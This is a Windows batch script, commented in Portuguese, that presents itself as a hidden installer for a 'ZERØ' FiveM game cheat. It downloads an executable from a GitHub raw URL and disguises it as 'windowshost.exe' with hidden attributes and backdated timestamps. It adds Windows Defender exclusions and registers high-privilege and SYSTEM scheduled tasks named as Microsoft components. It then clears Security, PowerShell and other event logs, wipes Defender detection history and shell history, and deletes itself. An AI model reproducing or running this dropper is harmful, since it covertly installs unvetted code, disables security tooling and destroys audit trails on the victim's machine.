@echo off
:: ========================================
::  INSTALADOR AUTOMATICO ZERØ - WINDOWS 10
::  Instala o cheat de forma oculta
:: ========================================

title Instalador ZERØ
color 0A

echo.
echo ========================================
echo    INSTALADOR ZERØ
echo ========================================
echo.

:: Etapa 1: Verificar Windows 10
echo [*] Etapa 1/7: Verificando Windows 10...
ver | findstr /i "10.0" >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Este programa requer Windows 10!
    echo.
    echo Por favor, use Windows 10 para continuar.
    echo.
    pause
    exit /b 1
)
echo [OK] Windows 10 detectado!
echo.

:: Etapa 2: Verificar privilégios admin
echo [*] Etapa 2/7: Verificando privilegios de Administrador...
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Este script precisa ser executado como Administrador!
    echo.
    echo Por favor:
    echo 1. Feche esta janela
    echo 2. Clique com botao direito no arquivo
    echo 3. Selecione "Executar como administrador"
    echo.
    pause
    exit /b 1
)
echo [OK] Privilegios de Administrador confirmados!
echo.

:: URL do executável no GitHub
set "GITHUB_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"

:: Diretório de instalação oculta (pasta com MUITOS arquivos do sistema)
:: WindowsApps tem muitos arquivos de aplicativos UWP, nosso arquivo se mistura naturalmente
set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\WindowsApps"

:: Criar diretório se não existir (normalmente já existe com muitos arquivos)
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
)

:: Nome totalmente genérico sem números (parece componente do Windows)
set "EXE_NAME=windowshost.exe"
set "INSTALL_PATH=%INSTALL_DIR%\%EXE_NAME%"

:: Etapa 3: Configurar diretório
echo [*] Etapa 3/7: Configurando diretorio de instalacao...
echo [OK] Diretorio configurado: %INSTALL_DIR%
echo.

:: Etapa 4: Download
echo [*] Etapa 4/7: Baixando executavel do GitHub...
echo Aguarde, isso pode levar alguns segundos...

:: Baixar usando certutil (método 1)
certutil -urlcache -split -f "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1

:: Se falhar, tentar PowerShell (método 2)
if not exist "%INSTALL_PATH%" (
    echo [*] Tentando metodo alternativo...
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%INSTALL_PATH%' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
)

:: Se ainda falhar, tentar BitsAdmin (método 3)
if not exist "%INSTALL_PATH%" (
    echo [*] Tentando metodo alternativo 2...
    bitsadmin /transfer "Download" /download /priority high "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1
)

:: Verificar se o download foi bem-sucedido
if not exist "%INSTALL_PATH%" (
    echo.
    echo [ERRO] Falha ao baixar executavel do GitHub!
    echo.
    echo Possiveis causas:
    echo - Conexao com internet instavel
    echo - URL do GitHub incorreta
    echo - Repositorio privado (precisa ser publico para Raw URLs)
    echo.
    echo Verifique a URL no arquivo install.bat:
    echo %GITHUB_URL%
    echo.
    pause
    exit /b 1
)

echo [OK] Download concluido com sucesso!
echo.

:: Etapa 5: Ocultação
echo [*] Etapa 5/7: Configurando arquivo e aplicando tecnicas de ocultacao...

:: ========================================
:: OCULTAÇÃO AVANÇADA - MÚLTIPLAS CAMADAS
:: ========================================

:: Camada 1: Atributos Sistema + Oculto (básico)
attrib +s +h "%INSTALL_PATH%" >nul 2>&1

:: Camada 2: Ocultar de buscas do Windows (não indexar)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f = '%INSTALL_PATH%'; if (Test-Path $f) { $file = Get-Item $f; $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed }" >nul 2>&1

:: Camada 3: Definir data de modificação antiga (parece arquivo do sistema)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f = '%INSTALL_PATH%'; if (Test-Path $f) { $file = Get-Item $f; $file.LastWriteTime = (Get-Date).AddYears(-2); $file.CreationTime = (Get-Date).AddYears(-2) }" >nul 2>&1

:: Camada 4: Remover de histórico de arquivos recentes
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs' -Name '*windowshost*' -ErrorAction SilentlyContinue" >nul 2>&1

:: Camada 5: Ocultar do índice de pesquisa do Windows
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

:: Adicionar exceção no Windows Defender
echo [*] Adicionando excecao no Windows Defender...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '%INSTALL_PATH%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1

echo [OK] Ocultacao aplicada com sucesso!
echo.

:: Etapa 6: Tarefa agendada
echo [*] Etapa 6/7: Criando tarefa agendada...
set "TASK_NAME=Microsoft\Windows\WindowsApps"
set "TASK_DESCRIPTION=Componente de Host de Aplicativos do Windows"

:: Verificar se o arquivo existe antes de criar a tarefa
if not exist "%INSTALL_PATH%" (
    echo [ERRO] Arquivo nao encontrado: %INSTALL_PATH%
    pause
    exit /b 1
)

:: Remover tarefa existente (se houver)
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

:: Aguardar um pouco para garantir que a exclusão foi processada
timeout /t 2 /nobreak >nul 2>&1

:: Criar nova tarefa usando PowerShell (com privilégios elevados)
:: IMPORTANTE: Usar caminho absoluto e garantir que a tarefa seja criada corretamente
echo [*] Tentando criar tarefa via PowerShell...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$action = New-ScheduledTaskAction -Execute '%INSTALL_PATH%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew; Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description '%TASK_DESCRIPTION%' -Force" >nul 2>&1

:: Verificar se PowerShell funcionou
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Tarefa criada via PowerShell!
) else (
    echo [*] PowerShell falhou, tentando metodo alternativo...
    :: Se PowerShell falhar, usar schtasks como fallback
    schtasks /create /tn "%TASK_NAME%" /tr "\"%INSTALL_PATH%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /f >nul 2>&1
    
    :: Verificar novamente
    schtasks /query /tn "%TASK_NAME%" >nul 2>&1
    if %errorLevel% equ 0 (
        echo [OK] Tarefa criada via schtasks!
    ) else (
        echo [AVISO] Falha ao criar tarefa agendada!
        echo [AVISO] Tentando metodo final...
        :: Tentar criar via SYSTEM (pode precisar de privilégios)
        schtasks /create /tn "%TASK_NAME%" /tr "\"%INSTALL_PATH%\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
        
        :: Verificar novamente
        schtasks /query /tn "%TASK_NAME%" >nul 2>&1
        if %errorLevel% equ 0 (
            echo [OK] Tarefa criada via SYSTEM!
        ) else (
            echo [ERRO] FALHA CRITICA: Nao foi possivel criar a tarefa agendada!
            echo [ERRO] O programa NAO vai iniciar automaticamente no logon.
            echo [ERRO] Por favor, execute novamente como Administrador.
            pause
            exit /b 1
        )
    )
)
echo.

:: Criar scheduled task para cleanup (sem UAC)
echo [*] Criando tarefa de limpeza...
set "CLEANUP_TASK_NAME=Microsoft\Windows\WindowsApps\Cleanup"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$action = New-ScheduledTaskAction -Execute '%INSTALL_PATH%' -Argument '/cleanup'; $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; Register-ScheduledTask -TaskName '%CLEANUP_TASK_NAME%' -Action $action -Principal $principal -Settings $settings -Description 'Servico de Limpeza do Runtime de Fala' -Force" >nul 2>&1

:: Etapa 7: Limpeza
echo [*] Etapa 7/7: Limpando rastros de instalacao...

:: Limpar cache do certutil (remove histórico de downloads)
certutil -urlcache * delete >nul 2>&1

:: Limpar histórico do PowerShell (remove comandos executados)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Clear-History -ErrorAction SilentlyContinue; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue" >nul 2>&1

:: Limpar arquivos temporários relacionados
del /q /f "%TEMP%\install.bat" >nul 2>&1
del /q /f "%TEMP%\*.tmp" >nul 2>&1
del /q /f "%TEMP%\*install*" >nul 2>&1
del /q /f "%TEMP%\*download*" >nul 2>&1

:: Limpar histórico de arquivos recentes do Windows
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs' -Name '*install*' -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs' -Name '*download*' -ErrorAction SilentlyContinue" >nul 2>&1

:: Limpar TODOS os logs do Windows 10 relacionados à instalação
:: IMPORTANTE: Limpar PRIMEIRO o log que registra limpezas para não deixar rastros
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$logs = @('Microsoft-Windows-Eventlog/Operational', 'Application', 'System', 'Security', 'Setup', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-Windows Defender/Operational', 'Microsoft-Windows-Security-Auditing', 'Microsoft-Windows-TaskScheduler/Operational', 'Microsoft-Windows-Bits-Client/Operational', 'Microsoft-Windows-Diagnostics-Performance/Operational', 'Microsoft-Windows-Kernel-PnP/Configuration', 'Microsoft-Windows-WinRM/Operational', 'Microsoft-Windows-WindowsUpdateClient/Operational'); foreach ($log in $logs) { wevtutil cl $log /quiet 2>$null }; wevtutil cl 'Microsoft-Windows-Eventlog/Operational' /quiet 2>$null" >nul 2>&1

:: Limpar histórico de quarentena do Defender
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-MpThreatDetection | Remove-MpThreatDetection -ErrorAction SilentlyContinue" >nul 2>&1

:: Limpar cache do certutil, bitsadmin, PowerShell
certutil -urlcache * delete >nul 2>&1
bitsadmin /reset /allusers >nul 2>&1

:: Criar batch file para auto-deletar este script
set "SELF_DELETE=%TEMP%\delete_install_%RANDOM%.bat"
(
    echo @echo off
    echo timeout /t 5 /nobreak ^>nul
    echo del /q /f "%%~f0" ^>nul 2^>^&1
) > "%SELF_DELETE%"
start "" /min "%SELF_DELETE%"

echo [OK] Limpeza concluida!
echo.

:: Resultado final
echo ========================================
echo    INSTALACAO CONCLUIDA!
echo ========================================
echo.
echo [OK] Executavel instalado em:
echo     %INSTALL_PATH%
echo.
echo [OK] Tarefa agendada criada: %TASK_NAME%
echo [OK] O cheat sera executado automaticamente no proximo logon.
echo.
echo IMPORTANTE:
echo - Reinicie o PC para ativar a instalacao
echo - Apos reiniciar, abra o Spotify e inicie a musica "Ghard - Pinheiros"
echo - Depois abra o FiveM
echo - O cheat vai injetar automaticamente quando a musica tocar
echo.
echo [OK] Voce pode fechar esta janela.
echo.
timeout /t 5 /nobreak >nul
exit
